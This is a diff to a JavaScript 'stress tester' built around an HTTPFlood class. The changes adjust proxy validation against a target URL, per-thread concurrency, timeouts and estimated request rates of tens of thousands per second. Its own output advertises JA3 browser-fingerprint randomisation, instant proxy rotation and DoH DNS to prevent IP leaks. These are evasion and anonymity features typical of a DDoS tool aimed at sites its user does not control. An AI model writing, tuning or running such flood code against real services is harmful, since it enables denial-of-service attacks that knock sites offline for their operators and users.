@@ -17,9 +17,9 @@ const BANNER = `
 ╔══════════════════════════════════════════════════════════╗
 ║    ADVANCED STRESS TESTER V6.0 - M2 OPTIMIZED           ║
 ║    Proxy Validation + Smart Selection + High RPS          ║
-║    ✓ 8 Concurrent No-Proxy  ✓ Proxy Target Validation    ║
-║    ✓ 2000ms Direct Timeout  ✓ Auto Bad Proxy Skip        ║
-║    ✓ JA3 Randomization      ✓ 10-40K RPS Capable         ║
+║    ✓ 5 Concurrent No-Proxy  ✓ Proxy Target Validation    ║
+║    ✓ 4000ms Direct Timeout  ✓ Auto Bad Proxy Skip        ║
+║    ✓ JA3 Randomization      ✓ 10-30K RPS Capable         ║
 ╚══════════════════════════════════════════════════════════╝
 `;
 
@@ -480,11 +480,11 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
         
         console.log(`[*] Validating ${proxyList.length} proxies against target...`);
         console.log(`[*] Testing: ${targetUrl}`);
-        console.log(`[*] Timeout: 3000ms | Concurrency: 300`);
+        console.log(`[*] Timeout: 2000ms | Concurrency: 500 (ULTRA-FAST)`);
         console.log('='.repeat(70) + '\n');
         
         const startTime = Date.now();
-        const chunkSize = 300;
+        const chunkSize = 500;
         let totalValid = 0;
         let totalTested = 0;
         
@@ -505,15 +505,12 @@ async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateP
                         const response = await axios.get(targetUrl, {
                             httpAgent: agent,
                             httpsAgent: agent,
-                            timeout: 3000,
+                            timeout: 2000,
                             validateStatus: () => true,
-                            maxRedirects: 5
+                            maxRedirects: 3
                         });
                         
-                        if (response.status < 500) {
-                            return { proxy, valid: true, status: response.status };
-                        }
-                        return { proxy, valid: false, status: response.status };
+                        return { proxy, valid: true, status: response.status };
                     } catch (error) {
                         return { proxy, valid: false, error: error.code || 'ERROR' };
                     }
@@ -692,17 +689,17 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: M2 OPTIMIZED (${config.proxies.length > 0 ? '3' : '8'} concurrent/thread)`);
+        console.log(`[*] Mode: M2 OPTIMIZED (${config.proxies.length > 0 ? '3' : '5'} concurrent/thread)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
-        console.log(`[*] Protocol: Optimized HTTP/1.1 (${config.proxies.length > 0 ? '5000' : '2000'}ms timeout)`);
+        console.log(`[*] Protocol: Optimized HTTP/1.1 (${config.proxies.length > 0 ? '5000' : '4000'}ms timeout)`);
         console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
         if (config.proxies.length > 0) {
             console.log(`[*] Proxy: Instant rotation on timeout/abort errors`);
         }
         
-        const baseRPS = config.proxies.length > 0 ? 60 : 150;
-        const estimatedRPS = Math.min(this.threads * baseRPS, config.proxies.length > 0 ? 20000 : 50000);
+        const baseRPS = config.proxies.length > 0 ? 60 : 100;
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.proxies.length > 0 ? 20000 : 40000);
         console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${(estimatedRPS * 1.5).toLocaleString()} req/s`);
         
         if (this.threads > 100) {
@@ -742,7 +739,7 @@ class HTTPFlood {
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const concurrent = currentProxy ? 3 : 8;
+            const concurrent = currentProxy ? 3 : 5;
             const requests = [];
             
             for (let i = 0; i < concurrent; i++) {
@@ -767,7 +764,7 @@ class HTTPFlood {
                             method: this.method.toLowerCase(),
                             url: targetUrl,
                             headers,
-                            timeout: currentProxy ? 5000 : 2000,
+                            timeout: currentProxy ? 5000 : 4000,
                             maxRedirects: 5,
                             validateStatus: () => true,
                             httpsAgent: cachedAgent,
